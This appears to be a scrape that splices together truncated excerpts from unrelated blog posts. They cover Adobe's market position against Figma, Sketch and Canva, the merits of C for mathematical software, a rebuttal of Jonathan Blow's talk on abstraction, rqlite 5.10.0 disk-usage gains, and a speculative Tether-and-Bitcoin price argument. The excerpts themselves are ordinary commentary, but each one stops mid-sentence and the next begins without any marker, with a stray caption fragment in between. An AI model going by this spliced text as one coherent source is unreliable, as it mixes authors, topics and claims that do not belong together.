<p>Today, Adobe looks incredibly strong. They’ve had spectacular stock performance, thanks to clear-eyed management who’ve made bold bets that have paid off. Their transition to SaaS has been seamless, for which the public markets have rewarded them handsomely. And they’re historically one of the <a href="https://en.wikipedia.org/wiki/List_of_acquisitions_by_Adobe">best companies at M&amp;A</a>; their product lineup is a testament to their ability to acquire new product lines and integrate them well into their multi-product ecosystem. Perhaps most importantly and least appreciated, they have dramatically sped up the cadence of their internal product development process and feedback loop. Like Microsoft, they have successfully shifted from a legacy company operating on an annual (or longer) release schedule to a truly cloud company shipping updates at a sub-weekly pace.</p>



<p>Nevertheless, there are a few segments of design where they’re no longer the market leader. Companies like Figma, Sketch, and Canva are examples of products that have been able to become top products despite Adobe’s ubiquity in all things design. Figma showed up in Adobe’s annual report for the first time in <a href="https://www.bamsec.com/filing/79634320000013">2019</a>. They reprised in <a href="https://www.bamsec.com/filing/79634321000004">2020</a>, and I’m not uncertain they will continue to be in it going forward.</p>



<p>How should we understand these market transitions and why these young companies are able to thrive, even against a strong incumbent like Adobe?</p>



<p>These companies have distinct atomic concepts from Adobe. The primitives that their products are built around are fundamentally different from those of Adobe’s product lineup. It’s these different fundamental atomic concepts that turn Adobe’s advantage of an established product and existing userbase into a weakness that hinders their ability to counter these upstarts. The opportunity for these new atomic concepts to thrive is driven by the new use cases and types of users unearthed during market transitions.</p>



<p>Understanding the phases of market transition and what drives them is a universal process worth examining.</p>



<h2>New use cases: designing for digital</h2>



<p>For most markets, there are advantages to being an incumbent. Markets converge as companies arrive at the preference frontier of customers. This leaves little potential energy for new startups to take advantage of.</p>



<p>Market entropy is good for new entrants.</p>



<p>It’s not impossible to break into a market by brute force, but it’s hard. Very hard. Most successful companies, especially startups, have found tailwinds to harness that help pull them forward.</p>



<p>Changing customer needs are the largest source of entropy in markets. When customer needs rapidly change, there is less advantage in being an incumbent. Instead, legacy companies are left with all the overhead and a product that no longer is what customers want.</p>



<p>There are many causes of changing customer needs. Often there are new and growing segments of customers with different use cases. Existing products may work for them, but they aren’t ideal. The features they care about and how they value them are very different from the customers the legacy company is used to. Companies resist changing core parts of their product for every new use case since it’s costly in work, money, and attention. But every once in a while, what was once a small use case grows into one large enough to support its own company.</p>



<p>Other times the scale or dynamics of a market shift enough to make a product no longer work despite having been a great fit. Companies are often caught flat-footed by these situations because what they have done successfully for years suddenly starts to falter—and they aren’t sure why. Ebay is a good example of this. Their decentralized auction model was very good in a nascent internet economy when there was a scarcity of items being sold online. Once ecommerce became commonplace, price and speed became much more important factors and Ebay’s decentralized model was at a disadvantage. Amazon was much better at building economies of scale in this post-liquidity ecosystem.</p>



<p>Another source is when the customers themselves change. Often the function of a tool remains the same, but the type of user changes. These new types of customers often have different things they care about and resulting product needs.</p>



<p>The internet drove entirely new design use cases. Photoshop was built for editing photos and images. It’s a powerful tool that operates at the pixel level. However, many of these new uses weren’t about image manipulation. Images were a component—not the essence—of the job users were trying to accomplish.</p>



<p>For some users, this was designing digital products. Designers at software companies or any company with a website wanted to create the websites and software products they worked on. This is less about image manipulation and more about designing the UI and UX of these digital products. Vectors are more important than raster graphics. The complexity and process of designing these high-value designs also got increasingly more sophisticated. These designers worked with teams of other designers and non-designers. Their designs are part of a larger product development process and what mattered wasn’t just making a design, but how that the entire process could be improved to make collaboration easier and handoff of designs better. Iteratively.</p>



<p>The complexity of the designs and the components in the resulting code became more complex, too. The need for their tools to have a higher-level understanding of the components and variants became more important. It’s increasingly useful for designs to understand the same concepts and abstraction levels as the HTML and CSS in the resulting end product.</p>



<p>For some users, this was designing content for social platforms, digital ads, or even wedding invitations. These were often made in Photoshop, but again, pixels are the wrong abstraction level. Images are not the sole component; they are just past of a larger design that includes graphics, text, and more. Similarly, the customers are very different. Many of the people now doing what is, in essence, design work don’t think of themselves as designers. They just have a very specific thing they want to create, with the least friction possible.</p>



<p>The internet dramatically scales up the volume and type of new use cases for design. In many ways, this helps Adobe. With platforms like Instagram, the number of people editing photos has expanded by many orders of magnitude. While editing on platforms like Instagram may have increased significantly, Adobe has been a huge beneficiary of the internet and the shift to cloud—and their <a href="https://www.google.com/finance/quote/ADBE:NASDAQ">stock price</a> is a testament to this.</p>



<p><em>[KK Note: Platforms like Instagram strapping editors onto their social platforms and eating into Lightroom from the bottom up is well worth its own discussion. And perhaps someone will convince Mike Krieger to do the definitive piece on that.]</em></p>

But it’s also building new worlds? I’m going to need a refresher on remembering the Andreessen Horowitz talking points</figcaption></figure>



<p>This is even more true in video. There are orders of magnitude more video creators as the ability to record video has become ubiquitous and the platforms where video is the default format have grown. Even more striking, many of the dominant video platforms—like Youtube—are purely distribution focused. They don’t even have any editing capabilities. Instead, companies like Adobe end up being large beneficiaries of this need.</p>



<p><em>[KK Note: Platforms like Youtube still having not built any semblance of an editor into their platform is *also* well worth its own discussion. I’d say we’ll never know what could be, but then I look at TikTok and all is right with the world.]</em></p>



<p>But Adobe hasn’t captured it all. And in many of these new emergent use cases and customer types, Adobe has lost the lead to new startups.</p>



<h2>Tapping into the right level of abstraction</h2>



<p>The best products map to how customers think about their workflow. They match the abstraction level of their customers: not too high that it’s unusable, but not too low that it’s hard to use easily or extend in more complex ways.</p>



<p>They choose the right atomic concepts.</p>



<p>These are the core concepts around which the entire product is built. They not only align with how customers think of their workflow, but often crystallizes for customers how they ought to. Great atomic concepts are honed and then extended and built upon in more complex compounds that…well for lack of a better word…<em>compound</em>.</p>



<p>Similar companies often have slightly different atomic concepts that end up making them meaningfully distinct. Photoshop is focused on pixels and images. Its focus is on editing images and pictures. And its functions operate by transforming them on a pixel level.</p>



<p>Illustrator is similar, but it operates on vectors, not pixels. This is a higher level abstraction. Neither is better or worse, they are just more suited to different use cases. Photoshop is better for modifying images, while illustrator is built for designs where scale-free vectors are best.</p>



<p>Sketch, like Illustrator, is vector based. But is designed for building digital products which means things like operating at a project level. It is not individual designs, but crafting entire products and user interfaces—and the needs for repeatability and consistency inherent to that.</p>



<p>Figma builds on Sketch’s approach, but also includes a greater focus on not just projects but the entire collaborative process as the relevant scope. Similarly, it also treats higher level abstractions like plugins, community, and more as equally important concepts.</p>



<p>Canva is similar to Photoshop and Illustrator, but its users aren’t designers who care about low level tools. Instead Canva’s core atomic concepts are around the different …</p></div></div>

<p><i>January 28, 2021</i></p>


<p>
I sometimes get asked whether it makes sense to implement <i>XYZ</i> in C,
especially compared to using some language that is more advanced
(C++, Julia, Python, Haskell or Rust) or perfect (Lisp).
</p>

<p>
I suspect that a lot of people are a bit intimidated by C and believe that
it requires some kind of superhuman hacker ability to wield.
That's at least how I felt about C
before I started really using it.
Other people believe that C is a horrible
language that inherently produces defective software
and which should be cast back into the abysses of UNIX from whence it came
(they are not necessarily wrong).
I personally think that C's simplicity
is an advantage that
often outweighs its disadvantages,
but there are clearly domains where C is a bad choice.
In domains where C works well, there are also good
alternatives, and choosing C then just comes
down to personal preference.
</p>

<p>
In this post, I will attempt to answer why you should or shouldn't use C,
and I will give some general advice that may be helpful if you end up using C.
This is based on my own experience developing
mathematical software in C (mainly <a href="https://flintlib.org/">Flint</a>,
<a href="https://arblib.org/">Arb</a> and <a href="https://fredrikj.net/calcium/">Calcium</a>), in an academic setting.
This experience will not necessarily transfer well to other settings.
</p>

<h2>Why you should use C</h2>

<p>Why should you write your next library
in C, or perhaps contribute to some existing C library?
I will offer four simple arguments.</p>

<h3>Availability</h3>

<p>
Reason number one is that C is stable, universally supported,
and has reliable tooling.
Your plain C library will compile and run
almost anywhere, can be developed anywhere,
and will require minimal dependencies. Users of virtually
any other programming language can easily interface with your code
through their language's C foreign function interface,
at least if you take basic precautions to design a decent external API.
Not only will your C library run anywhere
<i>right now</i>; it will still run 20 years from now,
and if you had a time machine, probably 20 years ago too.
</p>

<h3>Speed</h3>

<p>
Reason number two is that it will run very, very fast.
I don't just mean that
benchmark loops will
go <i>VROOOM</i>; your software will also start up instantly
(no need to load a bloated dynamic runtime or JIT-compile code),
and there will be no hidden overhead for things like automatic
garbage collection
(well-written C code spends a negligible fraction of its overall
execution time doing allocations and deallocations,
precisely at the points in time where they are needed).
This is, of course, <i>if you know what you are doing</i>.
Writing efficient C, while not exactly rocket surgery, does require
proficiency with the language and a solid understanding
of fundamental algorithms and data structures.
</p>

<h3>Readability</h3>

<p>Reason number three is that you will be able to read your
own code, and others will incidentally be able to read it too.
Some people are going to disagree with me here, arguing that higher
level languages are better for readibility.
That is trivially true in the sense that higher level languages
provide abstractions that allow expressing complex ideas more
succinctly.
A simple example is providing operator overloading so that you
can write <tt>a + b * c</tt> instead of something like <tt>add(a, mul(b, c))</tt>,
or in C, often something even more verbose like the following typical <a href="https://gmplib.org/">GMP</a> snippet:
</p>

<pre>mpz_t tmp;
mpz_init(tmp);
mpz_mul(tmp, b, c);
mpz_add(a, a, tmp);
mpz_clear(tmp);
</pre>

<p>This
would seem like an especially important point for mathematical software.
However, hiding details can also
hide useful information.
In an object-oriented, memory-managed,
operator-overloaded language, information that may be
hidden by the infix arithmetic notation includes
where and how memory is allocated;
how methods are resolved and how coercions are made
when the operands have different types
or when class hierarchies are involved;
what algorithms are used to perform the arithmetic operations
(irrelevant for machine integers, but potentially very important
details if you are multiplying huge matrices).
The infix notation is usually good for understanding the intent
of the code, but something more verbose can be
better for reasoning about performance
and for dealing with cracks in the abstractions.
Put concisely, C is good for making implementation details explicit
when implementation details matter.
</p>

<p>Viewed in this light, C's omission of certain conveniences
such as namespaces, overloading and generics is actually a feature,
not a bug.
Figuring out what any given piece of C code does tends to be
a straightforward process because of, and not despite, the fact
that it is verbose: everything that happens is explicit and functions and types can only have a
single definition which is easy to grep for.
I can't recall ever really having trouble diving into someone else's C code
or reading C code that I wrote a long time ago.
The same can't be said for Python, for example, where it can be
a real struggle to understand which method on which class gets called and how
and when and in what context.
Granted, you <i>can</i> obfuscate C code by abusing macros, doing
complicated runtime generics, or using cryptic names,
but even something like the rather dense
and idiosyncratic <a href="https://pari.math.u-bordeaux.fr/">Pari/GP</a>
codebase is penetrable after a short familiarization process.
</p>

<h3>Educational value</h3>

<p>
Reason number four is that you will learn a lot in the process of writing C.
Implementing algorithms in C instead of a higher-level language
can lead to a deeper understanding since you have
to do more of the groundwork yourself. You will also probably have to
think things through more carefully; when I write Python, I can often
get away with implementing something half-broken and fixing it piecemeal,
but C more often forces me to be correct up-front.
</p>

<h2>Why you shouldn't use C</h2>

<p>Now on to the far more interesting case <i>against</i> C,
or rather, a fair and balanced evaluation of C's weaknesses.</p>

<h3>Mathematical understanding</h3>

<p>
Since we are talking about <i>mathematical</i> software, it is likely
that implementing <i>XYZ</i> actually involves solving two problems: understanding the
mathematics of <i>XYZ</i>, and translating that understanding
to concrete algorithms and code. If you don't understand the mathematics,
you might be better off exploring the problem
using a high-level language or a computer algebra system
and postponing a C implementation (if you need it) until
your mathematical understanding has crystallized.
If you decide to start a C project right away
to figure out the mathematics in parallel with the software development,
you will probably still want to use
another language for experimentation (more on this later).
Be prepared to continuously reevaluate your assumptions, and
expect having to rewrite code from scratch more than once.
</p>

<h3>Portability and deployment</h3>

<p>The following comments mainly apply to starting a new project
intended to be used by other people.</p>

<p>
In practice, the claims about C's amazing portability are somewhat
exaggerated.
As a C library maintainer,
you will have a lot of fun gradually discovering
new inconsistencies in build systems and standard library implementations
between different operating systems and hardware configurations.
You will probably run into the occasional rare compiler bug (though C might be
one of the better languages in this regard).
Over time, your header files will probably accumulate hundreds
of <tt>#ifdef</tt>s intended to work around compatibility problems
that may or may not still exist.</p>

<p>The large majority of your prospective users will probably
be unable or unwilling to
build and install your library from source, so
you will either have to distribute binaries yourself or
rely on distribution via third-party
package repositories such as those of the major Linux distributions.
In the interest of stability
or because of a lack of manpower,
such repositories typically keep software 1-10 years out of date.
(Yes, I once found <a href="https://travis-ci.org/">Travis CI</a>'s default Ubuntu configuration sporting a nearly 10 years old
Flint-1.6.)
In other words, you can't count on users having access to the latest features
and bugfixes
in your library, and it goes without saying that you should work
very hard to preserve backward compatibility.
I suppose this lag in deployment has one advantage for reproducible research: if
you submit a journal paper based on the cutting edge version of your software,
readers will probably still have access to that version in Debian LTS
by the time the publishing process completes three years later
(hi, <a href="https://dl.acm.org/journal/toms">ACM Transactions on Mathematical Software</a>).</p>

<p>
A good idea for widespread deployment is to get your mathematical library into
<a href="https://www.sagemath.org/">SageMath</a>.
SageMath is maintained by a large community
and tested on many platforms, and packages in SageMath are usually only several months out of date.
</p>

<p>Deploying software written in more modern programming languages is
typically easier since they have more sane build processes
and standard libraries that eliminate most of C's platform-dependent
headaches.
Nowadays many languages also have their own easy-to-use packaging systems
and centralized package repositories.
In practice, the best languages for portability and easy distribution
right now are probably (1) JavaScript (in the browser), and (2) Python.
Julia is not far behind, and in many respects better designed than Python,
but Python currently has the benefit of being preinstalled on many systems.
All of this being said,
<a href="https://emscripten.org/">Emscripten</a> is a promising
alternative distribution method for C code which may change the equation,
especially if you think a browser-based interface makes more
sense than linking together libraries and running code
in the terminal in the traditional way.
</p>

<h3>Safety</h3>

<p>
C has a reputation of leading to buggy, crash-prone software
and disastrous security vulnerabilities.
Commonly criticized aspects of C include its
manual memory management, weak type system, and
deviously undefined or implementation-defined semantics.
This reputation is generally deserved,
though in C's defense, I think the problems often</p></div></div>

<h2>Is Software Abstraction Killing Civilization?</h2>

<p><b>Or: Jonathan Blow is wrong but also right and we still
need to prevent the collapse of civilization</b></p>

<p><i>Early 2021</i></p>

<p>
I recently stumbled upon
<a href="https://www.youtube.com/watch?v=ZSRHeXYDLko">a talk by game
development guru Jonathan Blow</a>, about how software 
abstraction will lead to the end of civilization. Quick summary:
</p>
<ul>
  <li>Information passed on between generations is diluted.
    Practise is better than theory for keeping skills alive.</li>
  <li>Software runs the world.</li>
  <li>Abstraction fosters ignorance about low level programming.</li>
  <li>If we forget low level stuff, civilization will fall apart
    since we won't be able to keep vital software running.</li>
</ul>
<p>
It was one of those 
talks that might at a first glance seem perfectly reasonable, not least 
because similar ideas are regularly discussed in programmer circles by a
great number of 
people. Then you start thinking about what's said, and all the errors and 
misconceptions presented makes you feel troubled, because it's both 
tempting and easy to perpetuate the punchlines without
considering their implications. <b>I agree with Blow that it's
important to pass knowledge between generations. Therefore, the veracity
of that information is extremely important.</b> I propose that
the information given in the very talk about the importance of
such information, is in fact wrong on many counts.
</p>

<p>
That's why I, in this rather long text, have tried to examine Blow's
claims in detail. (TL;DR: Someone is wrong on the Internet - man with
ample spare time on his hands to the rescue!)
</p>

<h3>Some examples of collapsed civilizations and artefacts lost in time</h3>

<p>
I'm not a historian and will not comment on this first part of the talk. It doesn't matter much, though; my gripe is mainly with the second part.
</p>

<h3>Five nines</h3>

<p>
Blow says we used to use the "five nines" (99.999% uptime) metric when selling computer systems. Since his laptop has the habit of rebooting when in sleep mode, it can never be a candidate for 99.999% uptime. This part is true: five nines means a total yearly downtime of just above five minutes. This is presented as proof that we have lost a rhetoric of quality. This part is false.
</p>

<p>
In reality, five nines usually applies to things like emergency response switchboards (911), hospital systems, financial transaction processing, etc. It's also a metric usually accompanied by long contracts detailing various downtime scenarios that couldn't possibly count as downtime. It has never, ever been used to sell consumer laptops or the word processors we run on them.
</p>

<p>
It's also incorrect that five nines isn't used anymore: several companies, such as IBM and Amazon, sell such systems and services. Incidentally, IBM actually goes further and claims their Power9 platform can provide even higher availability. Provided, I'm sure, the network used to reach it is functioning and the client computers are working and, and, and... you get the point.
</p>

<p>
So, no, we haven't lost this rhetoric of quality. We've simply never used it the way Blow claims.
</p>

<p>
Oh, and in case anyone's wondering, my laptops never reboot unless I tell them to and one of them currently has an uptime of 55 days.
</p>

<p>
<img src="https://www.datagubbe.se/endofciv/uptime_brumbrum.png" alt="A photo of my laptop's screen, showing a 55 day uptime.">
</p>

<h3>"The industry hasn't produced robust software for decades"</h3>

<p>

What is robust? Is it my iPhone, going for weeks and months without a 
reboot? Is it
<a href="https://arstechnica.com/information-technology/2013/03/epic-uptime-achievement-can-you-beat-16-years/">the famous uptime of Novell's file and printer servers</a>, 
with documented instances running for 16 years? Is it the multi-year 
uptimes of a plethora of Unix, Windows and VMS machines? Is it the 365+ 
days (and counting) uptime of some random Linux web server I've got 
access to? Is it turnkey systems like IBM i, offering continuous 
availability?

</p>

<p>
Apparently none of the above, according to Blow.
</p>

<h3>"Tech companies are no longer about pushing tech forward"</h3>

<p>
Well, yes and no. I agree that the lifestyle app startups of Silicon Valley (and elsewhere) are hardly about pushing tech forward - but people more interested in making money rather than amazing technology has always been around. Was Infocom's umpteenth text adventure about pushing tech forward? Was any of the ten bazillion (a rough estimate) jumpy-shooty platform games produced? Was MS-DOS, single-tasking its way through 15 years of building Microsoft's empire right up until its last breath in version 6.22?
</p>

<p>
There's a lot of exciting stuff happening on the "hard tech" front. Blow does mention machine learning earlier in his talk, but "boring" things like file systems, web servers, databases and programming languages are also continually developed and improved upon. A lot of effort is also going into improving the various layers of abstraction, virtualization and containerization Blow is so adverse to - but him disliking them doesn't mean they're not about pushing tech forward.
</p>

<h3>"Abstraction leads to loss of capability."</h3>

<p>
Blow lists a number of programming languages, some of which have fallen out of fashion because of abstraction. His take basically boils down to learning assembly coding, memory management and pointers.
</p>

<p>
I agree that a large number of programmers today (myself included) are very happy with not having to deal with things like memory allocation and pointers. And yes, there are certainly horrifying examples of when abstraction gets the better of us. Plenty of web sites use a lot of completely unnecessary JavaScript framework voodoo to render a simple blog and plenty of supposed "desktop apps" are really running (very slowly) inside a bundled browser.
</p>

<p>
Despite that, I'm willing to bet a few bucks there are more people 
around today (including youngsters) who can program in C than ever 
before, and that more C and assembly code is being written than ever 
before. Linux and NetBSD, for example, are continuously being ported to 
pretty much everything that even vaguely resembles a CPU. Rust, a new 
language with a heavy focus on robustness, <b>does</b> feature pointers and 
lets the programmer manage memory. Harvard's introduction to Computer 
Science, CS50, is publicly available on Youtube and each year it 
features <a href="https://www.youtube.com/watch?v=cF6YkH-8vFk">a two hour
lecture on stuff like memory layout, pointers,
malloc() and free()</a>.
</p>

<p>
I agree that the things mentioned here are good to know about and I think anyone seriously into programming should at least try them out some time, if for no other reason than to understand why a lot of us prefer to avoid them if given the option to do so.
</p>

<p>
Oh, and garbage collection and functional programming aren't new 
abstractions. Lisp did both in the late 1950s and it's been used in a 
lot of "hardcore" settings, including
<a href="http://flownet.com/gat/jpl-lisp.html">NASA's Jet Propulsion Lab</a>.
And, unsurprisingly, a Lisp programmer will of course claim that Lisp
makes you much more productive than something with malloc() ever will.
</p>

<h3>"The productivity of Facebook employees is approaching zero"</h3>

<p>
Here we're shown some graphs of the rising number of Facebook and Twitter employees and Blow states that since Facebook doesn't really get that many new features each year, all those programmers mostly sit around and do nothing.
</p>

<p>
First of all, I'm pretty sure Facebook employs a wide range of staff who are not feature developers: lawyers, accountants, graphical 
designers, sysadmins, researchers, HR, middle management, etc. When not working on Facebook the site, employees of Facebook the company 
are also working on Instagram, WhatsApp and Oculus VR to name some of their other pursuits. I'd also argue that (measurable) individual 
output in general drops as a result of a company growing. You need to reach a certain critical mass to have a whole team working hard on 
a feature only to, by some managerial decision, drop it right before it's finished. Things like that happen all the time in large 
software companies and won't show up in Blow's rather flimsy metric.
</p>

<p>
More importantly, Blow constructs this argument around the assumption that Facebook's product is Facebook, in the sense of the social platform. This is of course wrong. Facebook doesn't have to add or change very many features on their social platform every year, they just have to keep things smooth enough for those who actually use those functions to stay content.
</p>

<p>
This is because Facebook's real product is an ad delivery platform.
</p>

<p>
As such, it collects massive amounts of personal and private data and churns it into targeted ads, all the while sucking people in with cleverly designed attention-grabbing dark patterns. I'm sure plenty of work is done on this by a whole lot of programmers, but it'll never appear as "features" to the user, only as corporate revenue. In that respect, Facebook programmers seem to be highly productive.
</p>

<h3>Ken Thompson's "Three Week Unix"</h3>

<p>
First off, I'm not out to belittle Ken Thompson's efforts here. Writing an assembler, editor and basic kernel in three weeks is highly respectable work by any standard. It's also a great piece of computer lore and fits Blow's narrative perfectly - especially with Kernighan's little quip about productivity in the end. Of course, we don't know how "robust" Thompson's software was at this stage, or how user friendly, or what kind of features it had. I'm going to boldly claim it would've been a hard sell today, even if it did run on modern hardware.
</p>

<p>
I'm also pretty sure Thompson dealt with little or nothing of the following during those three weeks: documentation, code reviews, daily standups, backlog grooming, user stories, unit tests, customer demands, A/B testing, writing commit messages and adhering to a corporate code formatting standard. We are after all talking about a guy who, when he could pick any names he wanted, opted for "creat", "mv" and "cp".
</p>

<p>
I'm also certain Thompson could work alone in a private office, rather than share an open floor plan with fifty colleagues incessantly shouting into cellphones, shuffling furniture around or having animated discussions about football two feet from his desk.
</p>

<p>
It's important to remember that apart from hardware and software, the working conditions for most developers are vastly different …</p></div></div>

<p>Since the release of<a href="https://github.com/rqlite/rqlite/releases/tag/v5.6.0" target="_blank" rel="noopener noreferrer"> 5.6.0</a> there are have been a number of distinct improvements, all aimed at reducing the amount of data written to disk. Why focus on disk usage? First because it’s long been obvious that disk IO is the performance bottleneck for rqlite, due to <a href="https://linux.die.net/man/2/fsync" target="_blank" rel="noopener noreferrer">fsync’ing</a> to the <a href="https://raft.github.io/" target="_blank" rel="noopener noreferrer">Raft log</a>. Secondly, rqlite aims to be a <em>lightweight</em> database, so keeping its disk footprint low is desirable. 5.10.0 now contains the following changes:</p>
<ul>
<li><a href="https://developers.google.com/protocol-buffers/docs/gotutorial" target="_blank" rel="noopener noreferrer">Protocol Buffer (Protobuf)</a> encoding of the SQL commands before they are written to the Raft log. Generally speaking protofbuf encoding is more space-efficient than JSON, which is what used in 5.6.0.</li>
<li>Compression of SQL queries (and batches of SQL queries) above a <a href="https://github.com/rqlite/rqlite/blob/v5.10.0/command/marshal.go#L14" target="_blank" rel="noopener noreferrer">certain threshold</a>, which happens before the Protobuf-encoding, and before the commands are written to the Raft log. The savings from compression are greater the larger the SQL queries sent to rqlite. This also has the nice affect of reducing network traffic from the leader node to other nodes in the cluster.</li>
<li>Compressing the copy of the SQLite database that becomes part of the <em>Raft snapshot</em>. Snapshotting is a critical step in <em>truncating</em> the Raft log, a process that ensures that the log doesn’t grow without limit. This snapshot is written to disk, for restart and recovery purposes.</li>
<li>No more use of disk for <a href="https://en.wikipedia.org/wiki/Scratch_space" target="_blank" rel="noopener noreferrer">scratch space</a>, during creation of the snapshot. Snapshot-creation now takes place entirely in memory.</li>
<li>During normal operation rqlite can use either an <a href="https://github.com/rqlite/rqlite/blob/v5.10.0/README.md#in-memory-databases" target="_blank" rel="noopener noreferrer">in-memory (the default)</a> or on-disk SQLite database. However restarting an on-disk node could previously take a long time, because applying changes from the Raft log to an on-disk database is significantly slower than writing to an in-memory database. Now 5.10.0, when running in on-disk mode, first rebuilds the SQLite in memory and only when that is complete does it move the database to disk. This means disk-based restarts are basically as fast as memory-based restarts.</li>
</ul>
<h2>Measuring the impact</h2>
<p>While it’s fairly easy to predict the impact the changes above will have, it’s always important <a href="https://www.philipotoole.com/a-prayer-for-distributed-systems-developers/">to confirm the results</a>. So I ran a simple, 6-hour load test against a single rqlite node, which used an in-memory SQLite database. The load test involved inserting a simple record into a table, over and over again. I used <a href="https://github.com/rqlite/rqlite/tree/v5.10.0/cmd/rqbench" target="_blank" rel="noopener noreferrer">rqbench</a> to perform the writes:</p>
<pre>rqbench -o 'CREATE TABLE foo (id INTEGER NOT NULL PRIMARY KEY, name TEXT)' -m 100 -n 1500000 'INSERT INTO foo(name) VALUES("fiona")'</pre>
<p>I used <a href="https://github.com/influxdata/influxdb" target="_blank" rel="noopener noreferrer">InfluxDB</a>, <a href="https://grafana.com/" target="_blank" rel="noopener noreferrer">Grafana</a>, and <a href="https://github.com/influxdata/telegraf" target="_blank" rel="noopener noreferrer">Telegraf</a> (specifically the <a href="https://github.com/influxdata/telegraf/tree/master/plugins/inputs/http" target="_blank" rel="noopener noreferrer">http</a> plugin) to collect (via the rqlite <a href="https://github.com/rqlite/rqlite/blob/master/DOC/DIAGNOSTICS.md" target="_blank" rel="noopener noreferrer">diagnostics endpoint</a>) and display the results.</p>
<p>Let’s take a look at 5.6.0 performance first (technically <a href="https://github.com/rqlite/rqlite/tree/v5.6.1" target="_blank" rel="noopener noreferrer">a patched version of 5.6.0</a> so the required metrics were collected).</p>
<p><a href="https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated.png"><img src="https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-1024x543.png" alt="" width="474" height="251" srcset="https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-1024x543.png 1024w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-300x159.png 300w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-768x407.png 768w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-1536x814.png 1536w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated.png 1872w" sizes="(max-width: 474px) 100vw, 474px"></a></p>
<p>Nothing too out of the ordinary. The CPU is never that busy and mostly waiting for IO. The amount of data being written to disk — and rate it is being written — steadily increases however, as the SQLite snapshots grow in size. The Raft subsystem operated normally — committing log entries, and performing a snapshot every couple of minutes or so.</p>
<p>Compare the results of the same test, this time for 5.10.0.</p>
<p><a href="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated.png"><img src="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-1024x543.png" alt="" width="474" height="251" srcset="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-1024x543.png 1024w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-300x159.png 300w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-768x407.png 768w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-1536x814.png 1536w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated.png 1872w" sizes="(max-width: 474px) 100vw, 474px"></a></p>
<p>This time disk activity is significantly down, but the trade-off is more CPU activity during the snapshot-compression cycles. This is exactly the trade-off I wanted to make, but it’s good to see that it is actually happening. Note that the disk footprint is much smaller too — it’s only 30% as large for (roughly) the same amount of SQL insertions.</p>
<h2>What didn’t change?</h2>
<p>The write-performance of rqlite generally hasn’t changed that much between versions, not with these relatively small SQL statements. Mildly disappointing perhaps. However snapshotting should put much less burden on the system, meaning much less disruption to the write-performance during that periodic process. And larger SQL statements should see a much bigger write-performance improvement relative to 5.6.0, as the compression wins should also be bigger.</p>
<p>It’s also good to see that write performance remained steady throughout each test. This wasn’t something I had explicitly tested before, and didn’t receive reports of any issues, but again, it’s good to see.</p>
<p>5.10.0 adds some other small features, as well as some more diagnostics. I also expanded the test suite, as code quality is very important to me. So <a href="https://github.com/rqlite/rqlite/releases" target="_blank" rel="noopener noreferrer">download</a> it and check it out.</p>

<p>In March 2020, unregulated crypto exchanges, led by Binance, switched to USDT as collateral for margin trading. This has led to a progressive release of around 1 million Bitcoins previously locked as collateral. The fact these newly available Bitcoins didn’t crash the price only makes sense if Tether scooped them up and is now holding them as reserves.</p>



<p>The price of Bitcoin is determined, same as for all assets, at the margin. The price is a market equilibrium between how many Bitcoins are available for trading, and how many Bitcoins are needed for daily flows:</p>



<p><strong>$BTC = Turnover / Supply</strong></p>



<p>This formula is quite straightforward: the price of Bitcoin rises with increasing use cases, and decreases with the amount of Bitcoins competing for these use cases. Note that Supply only means “Bitcoins available for trading” – all the Bitcoins sitting in HODL wallets don’t take part in the price discovery process.</p>



<h3>Bitcoin price and turnover</h3>



<p>There are three types of Bitcoin turnover:</p>



<ul><li>short term (a few days), for transfers (capital flight from China, unregulated exchange account funding, remittances)</li><li>medium term (a few months), for collateral and arbitrage (margin trading, Grayscale premium arbitrage)</li><li>long term (a few years), for HODLing</li><li></li></ul>



<p>There are also two types of one-way flows, impacting the amount of Bitcoins available:</p>



<ul><li>lost coins (reducing the Supply, positive for price)</li><li>mining rewards (increasing the Supply, negative for price)</li></ul>



<p>The first three flows compete for the Bitcoins that are available for trading at that time (“S” for Supply). For instance, if Bitcoins were only used for transfers, and people were using Bitcoin to transfer $10 billion per day, assuming an average transaction length of 1 day, the price of Bitcoin would be:</p>



<p><strong>$BTC = $10B / S</strong></p>



<p>If the Supply is 1 million Bitcoins, that would give you a $BTC market equilibrium price of $10,000. The idea is that people who use Bitcoin for real world use cases don’t care about its price, and will simply buy an amount in fiat that they need for their purpose, while the Bitcoins available for trading will compete for that fiat.</p>



<p>All things remaining equal, you have two rules:</p>



<ol><li>The lower the Supply, the higher Bitcoin’s price, and vice versa</li><li>The higher the flows, the higher Bitcoin’s price, and vice versa</li></ol>



<h3>The impact of USDT replacing Bitcoin</h3>



<p>Ever since exchanges started replacing Bitcoin by USDT for margin trading collateral, the amount of Bitcoins at exchange-controlled wallets has steadily decreased:</p>



<figure><img src="https://pbs.twimg.com/media/Ep6Hw6cXcAUYSYJ?format=jpg&amp;name=4096x4096" alt="Image"></figure>



<p>This trend has, of course, been compensated by a relentlessly increasing amount of USDT in circulation, to the tune of Bitcoin outflows multiplied by their price:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02.png 772w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02-300x138.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02-768x354.png 768w" sizes="(max-width: 772px) 100vw, 772px"></figure>



<p>Unsurprisingly, most of these new USDTs sit on exchanges, Binance being on the top of the list, as they’re being used as collateral:</p>



